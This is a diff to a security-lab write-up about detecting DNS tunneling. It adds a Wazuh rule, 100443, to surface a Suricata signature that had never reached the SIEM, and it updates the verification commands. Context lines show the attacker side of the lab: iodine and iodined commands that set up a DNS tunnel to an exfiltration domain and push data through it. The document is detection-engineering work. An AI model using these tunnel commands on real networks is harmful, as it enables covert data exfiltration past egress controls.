@@ -76,6 +76,38 @@ Two conditions, deliberately combined:
 Encoding-agnostic (it matches the shape, not iodine's specific codec) and scoped to REDTEAM:53, mirroring the
 beacon rules. **Verified firing on the live tunnel: 100 alerts,** all `10.10.10.20 → 10.10.40.119:53`.
 
+> [!warning] Gap found and fixed 2026-09-07 — this alone never reached the SOC.
+> Running the end-to-end capstone (`apt-scenario/run-scenario.sh`) for real surfaced something the 2026-09-05
+> exercise never checked: **9100010 is a Suricata sid, not a Wazuh rule.** It fires correctly in Suricata's own
+> `eve.json` on `rtr-01` (confirmed again live: 126 hits), but nothing ever turned it into a labeled Wazuh
+> alert — unlike the T1190 web attack, which got its own rule (100440) as a child of the stock Suricata rule
+> 86601. A fresh live tunnel (60 pings, 0% loss) proved it: the only thing that showed up in
+> `siem-01`'s `alerts.json` was the generic threat-intel CDB hit (rule 100210, "known-bad dest IP"), and only
+> because atk-01's IP happens to already be blocklisted from unrelated exercises. Remove that coincidence and
+> **DNS tunneling would have been completely invisible to the SIEM** — caught only by a human tailing
+> `eve.json` on the sensor box itself, which defeats the point of having a SIEM. See Detection 1b, below.
+
+## Detection 1b — the Wazuh rule the SOC actually sees (100443)
+
+`roles/siem/files/local_rules.xml`, built the same way 100440 (T1190) was — a child of the stock Suricata
+rule 86601, keyed on the signature text rather than re-parsing the sid:
+
+```xml
+<rule id="100443" level="13">
+  <if_sid>86601</if_sid>
+  <field name="alert.signature" type="pcre2">LAB DNS tunneling</field>
+  <description>DNS tunneling to REDTEAM — long encoded query names ($(alert.signature))</description>
+  <mitre><id>T1048.003</id><id>T1071.004</id></mitre>
+</rule>
+```
+
+Level 13, not 12, on purpose — 100210/100211 (the generic threat-intel CDB rules) are also children of 86601
+at level 12, and Wazuh's same-event precedence picks the *highest-level matching sibling*, not "all of them."
+A tie or a loss there means the labeled DNS-tunneling alert never surfaces, just the generic one — the exact
+bug already found and fixed for 100440 (see [`detection-catalog.md`](../phase-4-detection/detection-catalog.md)
+row #38). **Verified live:** re-ran the tunnel after deploying this rule — `firedtimes:100` on the very next
+burst of 60 pings.
+
 ## Detection 2 — the hunt (`hunt-dns-tunnel.py`, Zeek `dns.log`)
 
 The analyst's quantitative view, and the more robust one — it works on *any* destination, not just the scoped
@@ -124,11 +156,13 @@ iodined -f -c -P <pass> 10.8.0.1 t.exfil-lab.net
 iodine -f -r -P <pass> 10.10.40.119 t.exfil-lab.net
 ping -c 60 -i 0.1 10.8.0.1                       # push data through the tunnel
 
-# defender: the hunt + the live rule
+# defender: the hunt + the wire-level rule + the SOC-visible rule
 ./hunt-dns-tunnel.py                                                   # ranks exfil-lab.net #1
-ssh rtr-01-root "grep -aoE '\"signature_id\":9100010' /var/log/suricata/eve.json | wc -l"   # -> alerts
+ssh rtr-01 "grep -ac '\"signature_id\":9100010' /var/log/suricata/eve.json"   # Suricata's own view
+ssh siem-01 "sudo grep -a '\"id\":\"100443\"' /var/ossec/logs/alerts/alerts.json | tail"  # the SOC's view
 ```
 
 Rule: [`roles/router/files/suricata-local.rules`](../phase-7-automation/ansible/roles/router/files/suricata-local.rules)
-(sid 9100010) · egress model: `roles/router/files/nftables.conf` · hunt:
+(sid 9100010, the wire-level Suricata signature) → [`roles/siem/files/local_rules.xml`](../phase-7-automation/ansible/roles/siem/files/local_rules.xml)
+(rule 100443, the labeled Wazuh alert an analyst would actually see) · egress model: `roles/router/files/nftables.conf` · hunt:
 [`hunt-dns-tunnel.py`](hunt-dns-tunnel.py).
